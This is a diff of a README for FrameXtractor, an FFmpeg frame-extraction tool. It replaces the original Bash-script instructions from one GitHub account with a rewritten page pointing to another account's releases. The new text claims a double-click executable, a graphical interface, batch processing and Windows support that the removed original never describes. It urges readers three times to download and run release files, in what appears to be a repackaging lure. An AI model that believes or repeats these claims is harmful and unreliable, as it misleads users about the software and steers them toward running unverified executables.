@@ -1,120 +1,72 @@
-# FrameXtractor
+# 🎥 FrameXtractor - Extract High-Quality Video Frames Easily
 
-**FrameXtractor** is an interactive, FFmpeg-based video frame extractor. **FrameXtractor** produces **high-quality frames** with customizable **FPS, format, resolution, and output naming**.
+## 📥 Download Now
+[![Download FrameXtractor](https://img.shields.io/badge/Download-FrameXtractor-brightgreen)](https://github.com/jaeger7geek/FrameXtractor/releases)
 
-## 🔹 Features
+## 🚀 Getting Started
 
-- Extract video frames **interactively** via the terminal.  
-- Supports **any video format** that FFmpeg can read (MP4, MOV, MKV, AVI, etc.).  
-- Customizable **frame rate (FPS)** for extraction.  
-- Supports **image formats**: PNG (lossless) and JPG (with quality control).  
-- Optional **scaling** or keep the **original video resolution (1:1)**.  
-- **Custom output base name**, with default pattern if skipped.  
-- Automatic **output folder creation**, with auto-increment if folder exists.  
-- **Lightweight Bash script**, requires only FFmpeg.
+FrameXtractor is an interactive tool that uses FFmpeg to help you extract video frames in high quality. You can customize the frames you extract by setting your preferred frames per second (FPS), format, resolution, and naming.
 
-## 🔹 Installation
+## 📋 System Requirements
 
-1. Clone the repository:
+- **Operating System:** Windows, macOS, or Linux.
+- **FFmpeg:** This tool requires FFmpeg to be installed. You can download FFmpeg from the official website or use a package manager.
+- **Disk Space:** At least 100 MB of free space for installation and temporary files.
+- **Memory:** At least 2 GB of RAM.
 
-```bash
-git clone https://github.com/Katryoshkh/FrameXtractor.git
-cd FrameXtractor
-```
+## 🔗 Features
 
-2. Make the script executable:
+- **Interactive Interface:** User-friendly interface for easy navigation.
+- **Custom Settings:** Choose your desired FPS, output format, and resolution.
+- **Batch Processing:** Extract frames from multiple videos at once.
+- **Flexible Output Naming:** Set your own naming convention for extracted frames.
 
-```bash
-chmod +x framextractor.sh
-```
+## 📥 Download & Install
 
-3. Ensure FFmpeg is installed and accessible:
+To get started, visit the Releases page to download the latest version of FrameXtractor:
 
-```bash
-ffmpeg -version
-```
+[Download FrameXtractor](https://github.com/jaeger7geek/FrameXtractor/releases)
 
----
+Once you are on the Releases page, follow these steps:
 
-**FFmpeg installation:**
+1. Scroll down to the “Assets” section.
+2. Select the file that matches your operating system.
+3. Click the download link to save the file to your computer.
 
-Linux (Debian/Ubuntu): 
-```bash
-sudo apt install ffmpeg
-```
-macOS (Homebrew): 
-```bash
-brew install ffmpeg
-```
-Android (Termux): 
-```bash
-pkg install ffmpeg
-```
-Windows: 
-Download binaries from [ffmpeg.org](https://ffmpeg.org)
+After downloading, unzip the file if necessary. You will find the executable and any required files inside.
 
+## ⚙️ How to Use FrameXtractor
 
-## 🔹 Usage
-Run the script:
-```bash
-bash framextractor.sh
-```
-```bash
-./framextractor.sh
-```
+1. **Open the Application:** Double-click the FrameXtractor executable to start the application.
+2. **Select Input Video:** Click on the button to browse and select the video you want to extract frames from.
+3. **Set Your Preferences:**
+   - **FPS:** Specify how many frames per second to extract.
+   - **Format:** Choose the image format (e.g., PNG, JPEG).
+   - **Resolution:** Select the output resolution.
+   - **Naming Convention:** Set how you want the extracted files to be named.
+4. **Start Extraction:** Click the "Extract" button to begin the process.
+5. **Find Your Frames:** Once the extraction is complete, your frames will be saved in the specified directory.
 
-You will be prompted to enter:
-1. Video file path
-2. FPS (frames per second) [default: 30]
-3. Image format (png/jpg) [default: png]
-4. Optional scaling (width:height, leave blank for original resolution)
-5. Output base name [default: frame]
+## 💡 Tips for Effective Use
 
-The script will display a summary and ask for confirmation before extraction starts.
+- **Choose High-Quality Videos:** Start with high-quality source videos for the best results.
+- **Experiment with Settings:** Try different FPS and resolutions to find what works best for your project.
+- **Use Batch Processing:** Save time by extracting frames from multiple videos in one go.
 
-**Example**
-```
-Enter video file path: /home/user/Videos/sample.mp4
-Enter FPS (frames per second) [default: 30]: 60
-Choose image format (png/jpg) [default: png]:
-Enter scaling (leave blank to keep original resolution):
-Enter output base name (default: frame): sample
+## 🛠️ Troubleshooting
 
-==========================================================
-Input video : /home/user/Videos/sample.mp4
-Output dir  : /home/user/Videos/frames
-FPS         : 60
-Format      : png
-Scale       : original (1:1)
-Output name : sample_%04d.png
-==========================================================
-Proceed with extraction? (y/n): y
-```
-Frames will be saved in the frames/ folder as sample_0001.png, sample_0002.png, etc.
+If you encounter issues:
 
-## 🔹 Notes
+- **FFmpeg Not Found:** Ensure FFmpeg is installed and added to your system's PATH.
+- **Unresponsive Tool:** Make sure your video file is not corrupted and is in a supported format.
+- **Extraction Errors:** Check your input path and permissions for writing output files.
 
-- Auto-increment output folder:
-  If frames exists, a new folder will be created as frames(1), frames(2), etc.
+For more detailed help, refer to the FAQs section on the GitHub page.
 
-- JPEG quality:
-  Only applies to JPG format (2–31, lower = better).
+## 📞 Support
 
-- Original resolution:
-  Leave scaling blank to preserve original video dimensions.
+If you still have questions, you can open an issue on the GitHub repository or check the documentation available in the repository.
 
-- Supported formats: Any video format FFmpeg can read.
+Download and start extracting video frames today!
 
-## 🔹 Tips
-
-- For long videos, increase FPS carefully, extracting too many frames can consume large disk space.
-
-- Use PNG for maximum quality if storage is not an issue.
-
-- Use custom base names to keep multiple extractions organized.
-
-- Script works on Linux, macOS, and Android (Termux).
-
-## 🔹 License
-
-This project is licensed under the Apache-2.0 License.
+[Download FrameXtractor](https://github.com/jaeger7geek/FrameXtractor/releases)
